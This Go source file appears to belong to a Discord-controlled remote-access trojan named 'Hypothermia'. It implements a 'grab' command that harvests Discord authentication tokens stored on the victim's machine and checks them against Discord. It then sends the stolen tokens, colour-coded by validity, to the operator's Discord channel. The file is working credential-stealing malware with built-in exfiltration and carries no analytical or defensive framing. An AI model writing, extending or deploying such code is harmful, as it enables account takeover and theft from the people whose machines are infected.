package commands

import (
	"Hypothermia/src/utils/grabber"
	"github.com/bwmarrin/discordgo"
)

const (
	grabUsage string = "[discord]"

	gravArgsError string = "🟥 Expected 1 argument."
	gravUseError  string = "🟥 Invalid argument."

	grabNoTokens   string = "🟨 No tokens found."
	grabHaveTokens string = "🟩 Tokens found:"

	endStr string = "\x1b[0m\n"
)

func (*GrabCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
	if len(args) == 0 {
		s.ChannelMessageSendReply(m.ChannelID, gravArgsError+"\nUsage: "+grabUsage, m.Reference())
		return
	}

	if args[0] == "discord" {
		tokens := utils_grabber.GrabDiscord()
		if len(tokens) == 0 {
			s.ChannelMessageSendReply(m.ChannelID, grabNoTokens, m.Reference())
			return
		}

		var valid, invalid, httpError []string
		for _, token := range tokens {
			switch code := utils_grabber.ValidateToken(token); code {
			case -2:
				httpError = append(httpError, token)
			case 200:
				valid = append(valid, token)
			default:
				invalid = append(invalid, token)
			}
		}

		response := grabHaveTokens + "\n```ansi\n"
		for _, token := range valid {
			response += "[+] \x1b[2;31m\x1b[2;34m" + token + endStr
		}

		for _, token := range httpError {
			response += "[+] \x1b[2;31m\x1b[2;34m\x1b[2;33m" + token + endStr
		}

		for _, token := range invalid {
			response += "[+] \x1b[2;31m" + token + endStr
		}

		response += "```"

		s.ChannelMessageSendReply(m.ChannelID, response, m.Reference())
		return
	} else {
		s.ChannelMessageSendReply(m.ChannelID, gravUseError+"\nUsage: "+grabUsage, m.Reference())
		return
	}
}

func (*GrabCommand) Name() string {
	return "grab"
}

func (*GrabCommand) Info() string {
	return "grabs certain saved info from the users browsers"
}

type GrabCommand struct{}
